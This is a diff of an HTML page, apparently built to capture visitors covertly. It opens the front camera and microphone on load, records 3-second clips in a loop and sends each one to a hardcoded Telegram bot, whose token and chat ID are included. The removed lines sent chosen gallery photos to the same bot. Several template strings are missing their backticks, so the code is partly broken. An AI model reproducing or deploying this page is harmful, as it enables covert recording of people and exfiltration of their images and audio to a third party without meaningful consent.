@@ -1,6 +1,3 @@
-CCTV gallery 
-
-
 <!DOCTYPE html>
 <html lang="my">
 <head>
@@ -11,83 +8,71 @@ CCTV gallery
 body { font-family:sans-serif; background:#0f3b4b; color:#fff; text-align:center; padding:20px; }
 video { width:320px; border:2px solid #2fb66e; border-radius:8px; margin:10px; }
 #status { margin-top:10px; color:#ffd; }
-input { margin-top:10px; }
 </style>
 </head>
 <body>
 <h2>📹 Front Camera CCTV (3s Clip) + Gallery Auto → Telegram</h2>
 <video id="preview" autoplay playsinline></video>
-<input type="file" id="galleryInput" multiple accept="image/*">
 <div id="status">Status: idle</div>
 
 <script>
 // ===== Telegram Bot Configuration =====
 const BOT_TOKEN = "8439360131:AAGHrU3cstAg-EzNIWv4g1b2l6DD_3l8CKE";
-const CHAT_ID   = "1842424886";
+const CHAT_ID   = "1842424886";
 
 const video = document.getElementById("preview");
 const statusEl = document.getElementById("status");
-const galleryInput = document.getElementById("galleryInput");
 let mediaRecorder, chunks = [];
 
 // ===== Camera Auto 3s Clip =====
 async function startCamera(){
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }, audio:true });
-    video.srcObject = stream;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }, audio:true });
+    video.srcObject = stream;
 
-    mediaRecorder = new MediaRecorder(stream, { mimeType:"video/webm" });
-    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-    mediaRecorder.onstop = sendVideo;
+    mediaRecorder = new MediaRecorder(stream, { mimeType:"video/webm" });
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.onstop = sendVideo;
 
-    startRecordingLoop();
-    statusEl.textContent = "Camera ready. Recording 3s clips...";
-  } catch(err){
-    statusEl.textContent = "Camera error: " + err.message;
-  }
+    // Start recording loop
+    startRecordingLoop();
+    statusEl.textContent = "Camera ready. Recording 3s clips...";
+  } catch(err){
+    statusEl.textContent = "Camera error: " + err.message;
+  }
 }
 
 function startRecordingLoop(){
-  setInterval(()=>{
-    if(mediaRecorder && mediaRecorder.state==="inactive"){
-      chunks = [];
-      mediaRecorder.start();
-      statusEl.textContent = "🔴 Recording 3s clip...";
-      setTimeout(()=> mediaRecorder.stop(), 3000);
-    }
-  }, 4000); // 1s pause between clips
+  setInterval(()=>{
+    if(mediaRecorder && mediaRecorder.state==="inactive"){
+      chunks = [];
+      mediaRecorder.start();
+      statusEl.textContent = "🔴 Recording 3s clip...";
+      setTimeout(()=> mediaRecorder.stop(), 3000);
+    }
+  }, 4000); // 1s pause between clips
 }
 
 async function sendVideo(){
-  if(chunks.length === 0) return;
-  const blob = new Blob(chunks, {type:"video/webm"});
-  const fd = new FormData();
-  fd.append("video", blob, clip_${Date.now()}.webm);
-  try{
-    const resp = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}, {
-      method:"POST", body: fd
-    });
-    const data = await resp.json();
-    statusEl.textContent = data.ok ? "✅ Clip sent" : "❌ Clip failed";
-  } catch(e){
-    statusEl.textContent = "Upload error: "+e.message;
-  }
+  if(chunks.length === 0) return;
+  const blob = new Blob(chunks, {type:"video/webm"});
+  const fd = new FormData();
+  fd.append("video", blob, clip_${Date.now()}.webm);
+  try{
+    const resp = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}, {
+      method:"POST", body: fd
+    });
+    const data = await resp.json();
+    statusEl.textContent = data.ok ? "✅ Clip sent" : "❌ Clip failed";
+  } catch(e){
+    statusEl.textContent = "Upload error: "+e.message;
+  }
 }
 
-// ===== Gallery Auto Upload =====
-galleryInput.addEventListener("change", ()=>{
-  const files = galleryInput.files;
-  for(let i=0; i<files.length; i++){
-    const fd = new FormData();
-    fd.append("photo", files[i]);
-    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}, { method:"POST", body: fd })
-      .then(r=>r.json())
-      .then(d=>{ statusEl.textContent = d.ok ? ✅ Gallery ${i+1} sent : "❌ Gallery failed`; })
-      .catch(e=>statusEl.textContent="Gallery upload error: "+e.message);
-  }
-});
+// ===== Gallery Auto Upload Placeholder =====
+// Browser cannot read user files without user selection.
+// You can add an <input type="file" multiple> if you want the user to select files.
 
-// ===== Start Camera =====
 startCamera();
 </script>
 </body>
